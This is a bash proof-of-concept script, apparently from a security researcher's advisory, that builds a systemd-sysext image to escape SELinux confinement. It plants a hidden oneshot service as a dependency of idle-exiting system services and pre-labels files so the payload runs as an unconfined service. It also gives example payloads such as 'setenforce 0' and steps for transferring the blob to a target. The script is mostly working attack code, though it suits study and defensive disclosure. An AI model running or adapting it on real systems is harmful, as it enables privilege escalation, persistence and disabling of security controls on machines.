#!/bin/bash
#
# LinnemanLabs - sysext image builder (off-box) - dependency-unit
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# sysext allows mounting a DDI system extension over /usr or /opt.
# this script builds an image that contains a new systemd unit file,
# and symlinks (.wants) that make our service a dependency of another
# unloaded service. when that service is loaded next, it will pull in
# the dependency and start our dependent service. because we control
# the unit file, we control the capabilities and hardening applied.
#
# we do not need a systemctl daemon-reload if the other service is
# not currently loaded. there are many services that idle-exit and
# unload immediately after exiting. this script has several built-in.
#
# we set correct labels at image build time off-box because the overlay
# mounts with seclabel. we do not need any systemd D-Bus calls, etc.
# the symlink in the image is the full setup.
#
# could replace an entire existing service by overlaying its unit file.
# dependency service is simpler: don't have to undo any hardening applied
# in the real unit or worry about its PreExec or worry about responding to
# the d-bus ping. it is an option though when you have a good use-case.
#
# a confined foothold cannot label systemd_unit_file_t / bin_t itself,
# so build off-box where you have full root, then transfer the resulting
# <NAME>.b64 blob and feed it to sysext-overlay.sh.
#
# must match the .raw basename and extension-release.<NAME>
#
# VARS:
#   NAME=<image + unit basename>   default linnemanlabs-sysxt-poc
#   PIVOTS="<unit> ..."            units to wire our .wants into. default = localed + timedated
#   CMD=<shell one-liner>          inline payload (default: id + caps -> /run/sysext.out)
#                                  keep it single-quote-free (it is wrapped in sh -c '...')
#   PAYLOAD=<path>                 optional: bundle and execute script instead of inline CMD,
#                                  becomes ExecStart=/usr/bin/env sh /usr/lib/<NAME>/payload
#
# examples:
#   ./sysext-build-image.sh
#   CMD='id -Z > /run/x.out; setenforce 0' ./sysext-build-image.sh
#   PAYLOAD=./sysext-payload.sh ./sysext-build-image.sh
#
set -eu
NAME="${NAME:-linnemanlabs-sysext-poc}"
PIVOTS="${PIVOTS:-systemd-localed.service systemd-timedated.service}"
OUT="${OUT:-/run/linnemanlabs-poc.out}"
# doing chcon etc_t to make output readable from most confined daemons
DEFAULT_CMD="{ touch ${OUT}; chcon -t etc_t ${OUT}; id; grep ^Cap /proc/self/status; } > ${OUT} 2>&1"
CMD="${CMD:-$DEFAULT_CMD}"
PAYLOAD="${PAYLOAD:-}"

IMG="${NAME}.raw"
dd if=/dev/zero of="${IMG}" bs=1M count=8 status=none
mkfs.ext4 -qF "${IMG}"
M="$( mktemp -d )"
mount -o loop "${IMG}" "${M}"
# trap in case set -eu causes us to exit mid-work
trap 'umount "${M}" 2>/dev/null; rmdir "${M}" 2>/dev/null; rm -f "${IMG}"' EXIT

mkdir -p "${M}/usr/lib/systemd/system" "${M}/usr/lib/extension-release.d"

# the injected oneshot unit - ExecStart runs /usr/bin/env (bin_t) => unconfined_service_t
if [ -n "${PAYLOAD}" ]; then
  [ -f "${PAYLOAD}" ] || { echo "[-] PAYLOAD not found: ${PAYLOAD}"; exit 1; }
  mkdir -p "${M}/usr/lib/${NAME}"
  install -m0755 "${PAYLOAD}" "${M}/usr/lib/${NAME}/payload"
  EXEC="/usr/bin/env sh /usr/lib/${NAME}/payload"
else
  EXEC="/usr/bin/env sh -c '${CMD}'"
fi
cat > "${M}/usr/lib/systemd/system/${NAME}.service" <<EOF
[Unit]
Description=LinnemanLabs PoC
[Service]
Type=oneshot
ExecStart=${EXEC}
EOF

# wire our unit as a weak dependency of each target service - the .wants symlink is all we need,
# systemd determines dependencies at load time, we choose units that idle-exit and unload.
for piv in ${PIVOTS}; do
  mkdir -p "${M}/usr/lib/systemd/system/${piv}.wants"
  ln -sf "../${NAME}.service" "${M}/usr/lib/systemd/system/${piv}.wants/${NAME}.service"
done

# ID=_any tells sysext this image is valid for any distro
printf 'ID=_any\n' > "${M}/usr/lib/extension-release.d/extension-release.${NAME}"

# sysext mounts these images with seclabel so we need proper labels
# unit + symlinks = systemd_unit_file_t so init_t can read them
# payload script = bin_t so unconfined_service_t sh can read it
chcon -R -t systemd_unit_file_t "${M}/usr/lib/systemd/system"
[ -n "${PAYLOAD}" ] && chcon -R -t bin_t "${M}/usr/lib/${NAME}"

umount "${M}"; rmdir "${M}"; trap - EXIT
gzip -9c "${IMG}" | base64 -w0 > "${NAME}.b64"
rm -f "${IMG}"
echo "[+] built ${NAME}.b64 (~$( wc -c < "${NAME}.b64" ) bytes)"
echo "    deps wired   : ${PIVOTS}"
echo "    payload      : ${PAYLOAD:-inline CMD} -> ${OUT}"
echo "[*] transfer ${NAME}.b64 to target"
echo "    run on target: BLOB=/path/to/${NAME}.b64 ./sysext-overlay.sh"
exit 0
